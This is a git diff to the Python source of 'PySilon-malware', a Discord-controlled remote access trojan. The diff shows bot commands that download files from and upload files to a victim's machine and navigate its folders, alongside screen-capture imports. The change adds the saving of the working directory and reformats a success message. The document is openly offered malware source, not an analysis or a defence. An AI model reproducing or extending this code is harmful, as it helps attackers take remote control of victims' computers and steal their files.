@@ -6,11 +6,8 @@ from getpass import getuser
 from PIL import ImageGrab
 import subprocess
 import requests
+import json
 import os
-
-working_directory = ['C:', 'Users', getuser()]
-def save_working_dir_to_file():
-    print("work in progress") #! TODO: Will be used to remember working directory ever after restart, function should be called every time working dir changes
 
 @client.command(name='download')
 async def file_downloading(ctx, file_to_download=None):
@@ -132,7 +129,7 @@ async def file_uploading(ctx, argument=None, name_of_file=None):
                     f.write(response.content)
             else: return await ctx.send("```❗ File failed to upload.```")
             
-            embed = discord.Embed(title=f"🟢 Success",description=f"```Your file `{name_of_file}` has been successfully uploaded.```", colour=discord.Colour.green())
+            embed = discord.Embed(title=f"🟢 Success",description=f"Your file `{name_of_file}` has been successfully uploaded.", colour=discord.Colour.green())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await ctx.send(embed=embed)
 
@@ -225,12 +222,14 @@ async def travarse_working_dir(ctx, path=None):
                 else:
                     working_directory.append(path)
             await ctx.send('```You are now in: ' + '/'.join(working_directory) + '```')
+            save_working_dir()
         else:
             if os.path.isdir(path): 
                 working_directory.clear()
                 for dir in path.split('/'):
                     working_directory.append(dir)
                 await ctx.send('```You are now in: ' + '/'.join(working_directory) + '```')
+                save_working_dir()
             else:
                 await ctx.send('```❗ Directory not found.```')
 
